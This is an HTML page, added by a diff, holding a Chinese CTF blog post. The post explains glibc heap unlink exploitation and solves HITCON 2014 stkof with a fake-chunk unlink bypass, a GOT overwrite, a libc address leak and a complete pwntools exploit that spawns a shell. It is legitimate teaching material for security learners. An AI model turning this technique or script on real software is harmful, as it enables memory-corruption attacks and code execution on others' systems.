@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Unlink的学习与利用原理0x00 unlink是什么&amp;emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。       （图片来自ctf wiki）   其实操作就是（学过数据结构应该很好理解） 12p-&amp;gt;fd-&amp;gt;bk = p-&amp;gt;bkp-&amp;gt;bk-&amp;gt;fd = p-&amp;gt;fd 0x01 从源代">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink的学习与利用">
+<meta property="og:url" content="https://github.com/7nocturnal/7nocturnal.github.io/2018/05/20/Unlink学习/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="Unlink的学习与利用原理0x00 unlink是什么&amp;emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。       （图片来自ctf wiki）   其实操作就是（学过数据结构应该很好理解） 12p-&amp;gt;fd-&amp;gt;bk = p-&amp;gt;bkp-&amp;gt;bk-&amp;gt;fd = p-&amp;gt;fd 0x01 从源代">
+<meta property="og:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/figure/unlink_smallbin_intro.png">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006BCyJEgy1fri7bidjmej308x05t3yt.jpg">
+<meta property="og:updated_time" content="2018-05-22T12:58:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unlink的学习与利用">
+<meta name="twitter:description" content="Unlink的学习与利用原理0x00 unlink是什么&amp;emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。       （图片来自ctf wiki）   其实操作就是（学过数据结构应该很好理解） 12p-&amp;gt;fd-&amp;gt;bk = p-&amp;gt;bkp-&amp;gt;bk-&amp;gt;fd = p-&amp;gt;fd 0x01 从源代">
+<meta name="twitter:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/figure/unlink_smallbin_intro.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/7nocturnal/7nocturnal.github.io/2018/05/20/Unlink学习/"/>
+
+
+
+
+
+  <title>Unlink的学习与利用 | </title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title"></span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://github.com/7nocturnal/7nocturnal.github.io/2018/05/20/Unlink学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="七夜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ouka4zyv7.bkt.clouddn.com/%E5%9B%BE%E7%89%87.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Unlink的学习与利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-20T18:33:13+08:00">
+                2018-05-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/知识点总结/" itemprop="url" rel="index">
+                    <span itemprop="name">知识点总结</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Unlink的学习与利用"><a href="#Unlink的学习与利用" class="headerlink" title="Unlink的学习与利用"></a><center>Unlink的学习与利用</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h4 id="0x00-unlink是什么"><a href="#0x00-unlink是什么" class="headerlink" title="0x00 unlink是什么"></a>0x00 unlink是什么</h4><p>&emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。   </p>
+<p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/figure/unlink_smallbin_intro.png" alt="">  </p>
+<center>（图片来自ctf wiki）</center>
+
+<p><img src="http://ww1.sinaimg.cn/large/006BCyJEgy1fri7bidjmej308x05t3yt.jpg" alt=""></p>
+<p>其实操作就是（学过数据结构应该很好理解）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p-&gt;fd-&gt;bk = p-&gt;bk</div><div class="line">p-&gt;bk-&gt;fd = p-&gt;fd</div></pre></td></tr></table></figure>
+<h4 id="0x01-从源代码理解unlink"><a href="#0x01-从源代码理解unlink" class="headerlink" title="0x01 从源代码理解unlink"></a>0x01 从源代码理解unlink</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            </span></div><div class="line">    FD = P-&gt;fd;								      </div><div class="line">    BK = P-&gt;bk;								      </div><div class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		  </div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);   <span class="comment">//这里有一个unlink的防护</span></div><div class="line">    <span class="keyword">else</span> &#123;								      </div><div class="line">        FD-&gt;bk = BK;	    \\进行了检查(核心代码)						      </div><div class="line">        BK-&gt;fd = FD;							      </div><div class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </div><div class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </div><div class="line">            assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);			      </div><div class="line">            assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);			      </div><div class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      </div><div class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      </div><div class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </div><div class="line">                <span class="keyword">else</span> &#123;							      </div><div class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </div><div class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </div><div class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      </div><div class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </div><div class="line">                  &#125;							      </div><div class="line">              &#125; <span class="keyword">else</span> &#123;							      </div><div class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </div><div class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </div><div class="line">              &#125;								      </div><div class="line">          &#125;								      </div><div class="line">      &#125;									      </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看出我们需要满足以下条件才能绕过检查  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">FD-&gt;bk = BK;                              </div><div class="line">BK-&gt;fd = FD;</div></pre></td></tr></table></figure>
+<p>为了绕过检查，我们必须在全局变量区找到一个指向堆块的地方，若该指针为ptr  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">32</span>位  </div><div class="line">FD = ptr<span class="number">-12</span></div><div class="line">BK = ptr<span class="number">-8</span></div><div class="line"></div><div class="line"><span class="number">64</span>位  </div><div class="line">FD = ptr<span class="number">-0x18</span></div><div class="line">BK = ptr<span class="number">-0x10</span></div></pre></td></tr></table></figure>
+<h2 id="例题：2014-HITCON-stkof"><a href="#例题：2014-HITCON-stkof" class="headerlink" title="例题：2014 HITCON stkof"></a>例题：2014 HITCON stkof</h2><h4 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ file hitcon-14-stkof </div><div class="line">hitcon-14-stkof: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, </div><div class="line">$ checksec hitcon-14-stkof </div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
+<p>程序为64位，开了NX和Canary保护</p>
+<h4 id="0x01-流程分析"><a href="#0x01-流程分析" class="headerlink" title="0x01 流程分析"></a>0x01 流程分析</h4><ol>
+<li>alloc (输入分配内存的大小size)</li>
+<li>read_in  (往分配的内存中输入内容，允许写入任意长度，可造成堆溢出)</li>
+<li>free （释放内存块）   </li>
+<li>useless  （无用函数）</li>
+</ol>
+<h4 id="0x02-利用过程"><a href="#0x02-利用过程" class="headerlink" title="0x02 利用过程"></a>0x02 利用过程</h4><ul>
+<li>首先构造3个chunk：chunk1、chunk2、chunk3，</li>
+<li>利用漏洞溢出chunk2，使chunk2和chunk3合并，利用unlink</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">alloc(0x100)  # id 1</div><div class="line"># begin </div><div class="line">alloc(0x40)  # id 2</div><div class="line"># small chunk size in order to trigger unlink</div><div class="line">alloc(0x80)  # id 3</div><div class="line"># a fake chunk at global[2]=head+16 who&apos;s size is 0x20</div><div class="line">payload = p64(0)  #prev_size</div><div class="line">payload += p64(0x40)  #current size</div><div class="line">payload += p64(head + 16 - 0x18)  #fd +16因为这是bss段，第二个堆块</div><div class="line">payload += p64(head + 16 - 0x10)  #bk</div><div class="line">payload = payload.ljust(0x40, &apos;a&apos;)</div><div class="line"># overwrite global[3]&apos;s chunk&apos;s prev_size</div><div class="line"># make it believe that prev chunk is at chunk2</div><div class="line">payload += p64(0x40)</div><div class="line"># make it believe that prev chunk is free</div><div class="line">payload += p64(0x90)</div><div class="line">edit(2, len(payload), payload)</div><div class="line"># unlink fake chunk, so chunk[2] =&amp;(chunk[2])-0x18=head-8</div><div class="line">free(3)</div></pre></td></tr></table></figure>
+<ul>
+<li>修改 chunk0 为 free@got 地址，同时修改chunk1为 puts@got 地址，chunk2 为 atoi@got 地址</li>
+<li>free@got的值覆盖为puts@plt</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">'free'</span>]) + p64(stkof.got[<span class="string">'puts'</span>]) + p64(stkof.got[<span class="string">'atoi'</span>])</div><div class="line">edit(<span class="number">2</span>, len(payload), payload)</div><div class="line">payload = p64(stkof.plt[<span class="string">'puts'</span>])</div><div class="line">edit(<span class="number">0</span>, len(payload), payload)</div></pre></td></tr></table></figure>
+<ul>
+<li>leak出system地址，覆盖atoi@got</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">free(<span class="number">1</span>)</div><div class="line">puts_addr = p.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">puts_addr = u64(puts_addr)</div><div class="line">puts_offset = puts_addr - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">system_addr = puts_offset + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">payload = p64(system_addr)</div><div class="line">edit(<span class="number">2</span>, len(payload), payload)</div><div class="line">p.send(<span class="string">'/bin/sh'</span>)</div></pre></td></tr></table></figure>
+<h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">p = process(<span class="string">"./hitcon-14-stkof"</span>)</div><div class="line">stkof = ELF(<span class="string">'hitcon-14-stkof'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">head = <span class="number">0x602140</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.sendline(str(idx))</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.send(content)</div><div class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.sendline(str(idx))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># small chunk size in order to trigger unlink</span></div><div class="line">    alloc(<span class="number">0x100</span>) <span class="comment"># id 1</span></div><div class="line">    alloc(<span class="number">0x40</span>)  <span class="comment"># id 2</span></div><div class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># id 3</span></div><div class="line">    <span class="comment"># a fake chunk at chunk[2]=head+16 who's size is 0x40</span></div><div class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></div><div class="line">    payload += p64(<span class="number">0x40</span>)  <span class="comment">#size</span></div><div class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></div><div class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></div><div class="line">    <span class="comment">#payload += p64(0x20)  # next chunk's prev_size bypass the check</span></div><div class="line">    payload = payload.ljust(<span class="number">0x40</span>, <span class="string">'a'</span>)</div><div class="line">    <span class="comment"># overwrite chunk[3]'s chunk's prev_size</span></div><div class="line">    <span class="comment"># make it believe that prev chunk is at chunk[2]</span></div><div class="line">    payload += p64(<span class="number">0x40</span>)</div><div class="line">    <span class="comment"># make it believe that prev chunk is free</span></div><div class="line">    payload += p64(<span class="number">0x90</span>)</div><div class="line">    edit(<span class="number">2</span>, len(payload), payload)</div><div class="line">    </div><div class="line">    <span class="comment"># unlink fake chunk, so chunk[2] =&amp;(chunk[2])-0x18=head-8</span></div><div class="line">    free(<span class="number">3</span>)</div><div class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># overwrite chunk0 = free@got, chunk1=puts@got, chunk2=atoi@got</span></div><div class="line">    payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">'free'</span>]) + p64(stkof.got[<span class="string">'puts'</span>]) + p64(stkof.got[<span class="string">'atoi'</span>])</div><div class="line">    </div><div class="line"></div><div class="line">    edit(<span class="number">2</span>, len(payload), payload)</div><div class="line">    <span class="comment"># edit free@got to puts@plt</span></div><div class="line">    payload = p64(stkof.plt[<span class="string">'puts'</span>])</div><div class="line">    edit(<span class="number">0</span>, len(payload), payload)</div><div class="line"></div><div class="line">    free(<span class="number">1</span>)</div><div class="line"></div><div class="line">    puts_addr = p.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">    puts_addr = u64(puts_addr)</div><div class="line"></div><div class="line">    log.success(<span class="string">'puts_addr: '</span> + hex(puts_addr))</div><div class="line">    puts_offset = puts_addr - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">    system_addr = puts_offset + libc.symbols[<span class="string">'system'</span>]</div><div class="line">    log.success(<span class="string">'put_offset: '</span> + hex(puts_offset))</div><div class="line">    log.success(<span class="string">'system_addr: '</span> + hex(system_addr))</div><div class="line">    </div><div class="line">    <span class="comment"># turn atoi@got into system addr</span></div><div class="line">    </div><div class="line">    payload = p64(system_addr)</div><div class="line">    edit(<span class="number">2</span>, len(payload), payload)</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="comment">#p.send('/bin/sh')</span></div><div class="line">    p.interactive()</div><div class="line">pwn()</div></pre></td></tr></table></figure>
+<h4 id="0x04-题外话"><a href="#0x04-题外话" class="headerlink" title="0x04 题外话"></a>0x04 题外话</h4><p>由于unlink原理资料很多，所以本文原理介绍篇幅有限。这个程序没什么输出，很难看，分析起来很耗时间。复现题目一定要多换换参数，方法。如果本文有什么错误或者您有什么疑惑，请联系我。</p>
+<p>参考资料：<br><a href="http://wonderkun.cc/index.html/?p=651" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=651</a><br><a href="https://blog.csdn.net/qq_33528164/article/details/79586902" target="_blank" rel="external">https://blog.csdn.net/qq_33528164/article/details/79586902</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/#_3" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/#_3</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/pwntools的使用学习/" rel="next" title="pwntools的使用学习">
+                <i class="fa fa-chevron-left"></i> pwntools的使用学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://ouka4zyv7.bkt.clouddn.com/%E5%9B%BE%E7%89%87.jpg"
+               alt="七夜" />
+          <p class="site-author-name" itemprop="name">七夜</p>
+           
+              <p class="site-description motion-element" itemprop="description">Yesterday you said tomorrow</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/7nocturnal" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/6052711414/profile?topnav=1&wvr=6" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://monkeybean.cn" title="MonkeyBean" target="_blank">MonkeyBean</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsimp1er.com" title="Simp1er" target="_blank">Simp1er</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.magic1an.com" title="Magician" target="_blank">Magician</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
